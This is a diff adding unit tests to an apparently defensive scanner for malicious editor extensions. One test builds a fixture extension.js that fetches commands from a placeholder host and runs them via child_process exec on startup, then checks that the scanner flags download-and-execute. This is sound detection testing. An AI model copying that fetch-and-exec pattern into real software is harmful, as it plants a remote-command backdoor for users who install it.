@@ -3350,6 +3350,47 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(report.decision, "review")
         self.assertIn("download-and-execute", {finding.rule_id for finding in report.findings})
 
+    def test_transpiled_commonjs_namespace_process_alias_is_detected(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"transpiled-dropper","version":"1.0.0",'
+                '"activationEvents":["onStartupFinished"]}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                'const child_process_1 = require("child_process");'
+                'fetch("https://example.invalid/commands")'
+                '.then(response => response.text())'
+                '.then(command => (0, child_process_1.exec)(command));',
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("process-execution", rule_ids)
+        self.assertIn("dynamic-shell-execution", rule_ids)
+        self.assertIn("download-and-execute", rule_ids)
+
+    def test_namespace_process_alias_property_access_is_not_execution(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"process-helper","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                'const child_process_1 = require("child_process");'
+                'const method = child_process_1.exec;'
+                'module.exports = { method };',
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertNotIn("process-execution", {finding.rule_id for finding in report.findings})
+
     def test_far_apart_static_tokens_do_not_create_correlated_chain(self) -> None:
         with TemporaryDirectory() as tmp:
             root = Path(tmp)
